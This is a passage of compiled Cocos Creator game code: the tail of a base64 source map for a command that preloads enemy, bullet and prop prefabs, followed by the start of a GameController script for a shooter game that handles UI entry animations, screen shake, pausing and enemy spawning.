TUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxpQ0FBaUMsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNwRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyx1Q0FBdUMsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUMxRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxrQ0FBa0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNyRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyx3Q0FBd0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUMzRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw4QkFBOEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNqRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxzQ0FBc0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN6RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxxQ0FBcUMsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN4RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxxQ0FBcUMsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN4RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxxQ0FBcUMsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN4RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxvQ0FBb0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN2RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxvQ0FBb0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN2RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxvQ0FBb0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN2RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxvQ0FBb0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN2RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxvQ0FBb0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN2RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxvQ0FBb0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUN2RSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw0QkFBNEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUMvRCxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw0QkFBNEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUMvRCxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw0QkFBNEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUMvRCxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw0QkFBNEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUMvRCxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw0QkFBNEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUMvRCxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw0QkFBNEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUMvRCxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw0QkFBNEIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUMvRCxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw2QkFBNkIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNoRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw2QkFBNkIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNoRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw2QkFBNkIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNoRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw2QkFBNkIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNoRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQywyQkFBMkIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUM5RCxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxnQ0FBZ0MsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNuRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQywrQkFBK0IsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNsRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyw2QkFBNkIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDO2dDQUNoRSxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxtQkFBbUIsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDOzZCQUN6RCxDQUFDLENBQUMsSUFBSSxDQUFDLFVBQUEsR0FBRztnQ0FDUCxPQUFPLEVBQUUsQ0FBQzs0QkFDZCxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsVUFBQSxHQUFHO2dDQUNSLE1BQU0sQ0FBQyxHQUFHLENBQUMsQ0FBQzs0QkFDaEIsQ0FBQyxDQUFDLENBQUM7Ozt5QkFDTixDQUFDLEVBQUM7OztLQUNOO0lBcEVnQix1QkFBdUI7UUFEM0MsT0FBTyxDQUFDLHlCQUF5QixDQUFDO09BQ2QsdUJBQXVCLENBdUUzQztJQUFELDhCQUFDO0NBdkVELEFBdUVDLElBQUE7a0JBdkVvQix1QkFBdUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IHtJQ29tbWFuZH0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvSUNvbW1hbmRcIjtcclxuaW1wb3J0IHtFeGNlbENvbmZpZ30gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9jb25maWcvRXhjZWxDb25maWdcIjtcclxuaW1wb3J0IHt3eEFwaX0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay93eEFwaS93eEFwaVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzcyhcIlByZWxvYWRHYW1lU2NlbmVDb21tYW5kXCIpXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFByZWxvYWRHYW1lU2NlbmVDb21tYW5kIGltcGxlbWVudHMgSUNvbW1hbmQge1xyXG5cclxuICAgIGFzeW5jIGV4ZWN1dGUgKC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBQcm9taXNlLmFsbChbXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL2VuZW15L2VuZW15MVwiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9lbmVteS9lbmVteTJcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvZW5lbXkvZW5lbXkzXCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL2VuZW15L2VuZW15NFwiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9lbmVteS9lbmVteTVcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvZW5lbXkvZW5lbXk2XCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL2VuZW15L2VuZW15N1wiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9lbmVteS9lbmVteThcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDFcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDFTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDJcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDJTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDNcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDNTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDRcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDRTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDVcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDVTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDZcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDZTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDdcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDdTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDhcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDhTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDlcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDlTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldDEwXCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL2J1bGxldC9idWxsZXQxMFN0cmlrZVwiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9idWxsZXQvYnVsbGV0MTA4XCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL2J1bGxldC9idWxsZXQxMDhTdHJpa2VcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2ZpcmU3XCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL2V4cGxvc2l2ZS9leHBsb3NpdmU5XCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL2J1bGxldC9lbmVteUJ1bGxldDFcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2VuZW15QnVsbGV0MlwiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9idWxsZXQvZW5lbXlCdWxsZXQzXCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL2J1bGxldC9wcm9wQnVsbGV0MVwiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9idWxsZXQvcHJvcEJ1bGxldDJcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L3Byb3BCdWxsZXQzXCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL2J1bGxldC9wcm9wQnVsbGV0NFwiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9idWxsZXQvcHJvcEJ1bGxldDVcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYnVsbGV0L3Byb3BCdWxsZXQ2XCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL3Byb3AvcHJvcDFcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvcHJvcC9wcm9wMlwiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9wcm9wL3Byb3AzXCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL3Byb3AvcHJvcDRcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvcHJvcC9wcm9wNVwiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9lbnRpdGllcy9wcm9wL3Byb3A2XCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL3Byb3AvcHJvcDlcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvcHJvcC9wcm9wMTBcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvcHJvcC9wcm9wMTFcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvcHJvcC9wcm9wMTJcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvcHJvcC9wcm9wMTNcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvcHJvcC9ndW5zXCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL3Byb3AvcHJvcFN0YXRlXCIsIGNjLlByZWZhYiksXHJcbiAgICAgICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KFwicHJlZmFiL2VudGl0aWVzL3Byb3AvdGFrZVByb3BcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvZW50aXRpZXMvYmxvb2QvYmxvb2RcIiwgY2MuUHJlZmFiKSxcclxuICAgICAgICAgICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXdhaXQoXCJwcmVmYWIvcm9sZVN1cHBseVwiLCBjYy5QcmVmYWIpLFxyXG4gICAgICAgICAgICBdKS50aGVuKHJlcz0+e1xyXG4gICAgICAgICAgICAgICAgcmVzb2x2ZSgpO1xyXG4gICAgICAgICAgICB9KS5jYXRjaChlcnI9PntcclxuICAgICAgICAgICAgICAgIHJlamVjdChlcnIpO1xyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcblxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'a2a30D950ZPwLVWttC/Wqyp', 'GameController');
// script/app/game/GameController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var GameProxy_1 = require("./GameProxy");
var Extend_1 = require("../../../framework/extend/Extend");
var World_1 = require("../info/World");
var Shake_1 = require("../../../framework/extend/Shake");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var Music_1 = require("../../../framework/audio/Music");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var GameController = /** @class */ (function (_super) {
    __extends(GameController, _super);
    function GameController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.moreEnemyTipsAnimation = null;
        _this.bossTipsAnimation = null;
        _this.supplyGuideNode = null;
        _this.shakeNode = null;
        _this.topNode = null;
        _this.leftNode = null;
        _this.rightNode = null;
        _this.supplyNode = null;
        _this.greyNode = null;
        _this.blockNode = null;
        _this.reliveNode = null;
        _this.gameOverNode = null;
        _this._generating = false;
        _this._shakeDuration = 0;
        _this._genEnemyCount = 0;
        _this._propList = [1, 2, 3, 4, 5, 6, 9, 11, 12, 13];
        _this._gunsList = [];
        _this._displayPropList = [];
        _this._displayGusList = [];
        _this._preDisplayGun = false;
        return _this;
    }
    GameController.prototype.onClickSupply = function (event, data) {
        console.log("【click】 GameControllerSupply");
        this.supplyNode.active = true;
        var newbieNode = cc.director.getScene().getChildByName("newbieNode");
        if (newbieNode) {
            newbieNode.destroy();
            World_1.World.My.newbies.finish("KillFiveEnemy");
        }
    };
    GameController.prototype.playEntry = function () {
        var _this = this;
        var promises = [];
        this.topNode.active = true;
        this.topNode.y = cc.view.getVisibleSize().height / 2 + 300;
        var speed = 700;
        var distance = this.topNode.y - cc.view.getVisibleSize().height / 2;
        if (Extend_1.ext.isIphoneX) {
            distance += 66;
        }
        promises.push(this.topNode.runActionAwait(cc.moveBy(distance / speed, cc.v2(0, -distance))));
        this.leftNode.active = true;
        this.leftNode.x = -cc.view.getVisibleSize().width / 2 - 200;
        promises.push(this.leftNode.runActionAwait(cc.moveTo(Math.abs(-cc.view.getVisibleSize().width / 2 - this.leftNode.x) / speed, cc.v2(-cc.view.getVisibleSize().width / 2, this.leftNode.y))));
        this.rightNode.active = true;
        this.rightNode.x = cc.view.getVisibleSize().width / 2 + 200;
        promises.push(this.rightNode.runActionAwait(cc.moveTo(Math.abs(cc.view.getVisibleSize().width / 2 - this.rightNode.x) / speed, cc.v2(cc.view.getVisibleSize().width / 2, this.rightNode.y))));
        Promise.all(promises).then(function (res) {
            GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.StartGame);
            _this.blockNode.active = false;
        });
    };
    GameController.prototype.onLoad = function () {
        this.supplyNode.active = false;
        this.greyNode.active = true;
        this.greyNode.opacity = 0;
        this.reliveNode.active = false;
        this.gameOverNode.active = false;
        this.topNode.active = false;
        this.leftNode.active = false;
        this.rightNode.active = false;
        this.blockNode.active = true;
        this.node.on(GameProxy_1.GameProxy.Event.StartGenEnemy, this.startGenerating, this);
        this.node.on(GameProxy_1.GameProxy.Event.StopGenEnemy, this.stopGenerating, this);
        this.node.on(GameProxy_1.GameProxy.Event.KillEnemy, this.onKillEnemy, this);
        this.node.on(GameProxy_1.GameProxy.Event.KillRole, this.onKillRole, this);
        this.node.on(GameProxy_1.GameProxy.Event.SlowGame, this.onSlowGame, this);
        this.node.on(GameProxy_1.GameProxy.Event.PauseGame, this.onPauseGame, this);
        this.node.on(GameProxy_1.GameProxy.Event.ShakeScreen, this.onShakeScreen, this);
        GameProxy_1.GameProxy.GameScene = this.node;
        this.playEntry();
    };
    GameController.prototype.start = function () {
        GameProxy_1.GameProxy.level = World_1.World.Storage.gameLevel;
        GameProxy_1.GameProxy.slowGame = false;
        GameProxy_1.GameProxy.pauseGame = false;
        this._preDisplayGun = Math.random() * 100 > 50;
        GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.InitGame);
        this._propList = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Prop).filter(function (value) { return value['id'] != 7 && value['id'] != 8 && value['id'] != 10 && (value['unlock'] == 0 || World_1.World.My.propInfo.beUsing(value['id'])); }).map(function (value) { return value['id']; });
        this._gunsList = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon).filter(function (value) { return value['id'] != 1 && value['unlock'] <= World_1.World.Storage.gameLevel; }).map(function (value) { return value['id']; });
    };
    GameController.prototype.onDestroy = function () {
        this.node.off(GameProxy_1.GameProxy.Event.StartGenEnemy, this.startGenerating, this);
        this.node.off(GameProxy_1.GameProxy.Event.StopGenEnemy, this.stopGenerating, this);
        this.node.off(GameProxy_1.GameProxy.Event.KillEnemy, this.onKillEnemy, this);
        this.node.off(GameProxy_1.GameProxy.Event.KillRole, this.onKillRole, this);
        this.node.off(GameProxy_1.GameProxy.Event.SlowGame, this.onSlowGame, this);
        this.node.off(GameProxy_1.GameProxy.Event.PauseGame, this.onPauseGame, this);
        this.node.off(GameProxy_1.GameProxy.Event.ShakeScreen, this.onShakeScreen, this);
    };
    GameController.prototype.onShakeScreen = function (duration, strength_x, strength_y) {
        if (this._shakeDuration <= duration) {
            this._shakeDuration = duration;
            this.shakeNode.stopAllActions();
            this.shakeNode.position = cc.v2();
            this.shakeNode.runAction(Shake_1.Shake.create(duration, strength_x, strength_y));
        }
    };
    GameController.prototype.onSlowGame = function (slow) {
        // this.updateGrey();
        window['GameEnemysController'].allActiveEnemy().forEach(function (value) { return value.gameSlow = slow; });
    };
    GameController.prototype.onPauseGame = function (pause) {
        this.updateGrey();
    };
    GameController.prototype.updateGrey = function (opacity) {
        if (opacity === void 0) { opacity = 190; }
        console.log("updateGrey==>", GameProxy_1.GameProxy.pauseGame);
        this.greyNode.stopAllActions();
        if (GameProxy_1.GameProxy.pauseGame || GameProxy_1.GameProxy.slowGame) {
            this.greyNode.runAction(cc.fadeTo(0.3, opacity));
            // cc.tween(this.greyNode)
            //     .to(0.3, { opacity: opacity })
            //     .start();
        }
        else {
            this.greyNode.opacity = 0;
        }
    };
    /**
     * 启动怪物生成计划
     */
    GameController.prototype.startGenerating = function () {
        var _this = this;
        if (this._generating)
            return;
        this._generating = true;
        // console.log(GameProxy.enemyList, "enemyList");
        if (GameProxy_1.GameProxy.killCount < GameProxy_1.GameProxy.levelConfig.amount_p1) {
            /** 第一阶段 0.5s出一个怪物 */
